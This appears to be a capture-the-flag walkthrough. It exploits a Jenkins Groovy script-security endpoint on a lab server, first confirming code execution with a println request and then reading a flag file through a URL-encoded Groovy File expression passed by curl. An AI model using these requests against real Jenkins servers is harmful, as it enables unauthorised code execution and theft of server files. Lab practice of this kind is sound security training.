The exploit, step by step:

1. Confirm the bug still fires. Run:

    curl 'http://10.4.12.1:8080/jenkins/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?value=println(42)'

   You should see "Result: 42". If you don't, the URL got mangled
   on its way through. Try again with the WHOLE URL inside single
   quotes (so your shell doesn't eat any characters).

2. Swap the println(42) for a file read. The Groovy expression is:

       new File("/var/m0use/blueprint.txt").text

   URL-encoded for curl that becomes:

       new%20File(%22/var/m0use/blueprint.txt%22).text

   So the curl command is:

    curl 'http://10.4.12.1:8080/jenkins/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?value=new%20File(%22/var/m0use/blueprint.txt%22).text'

3. The server prints back the contents of the file. The flag is in
   there — find the line that starts with "Flag:" and submit it.
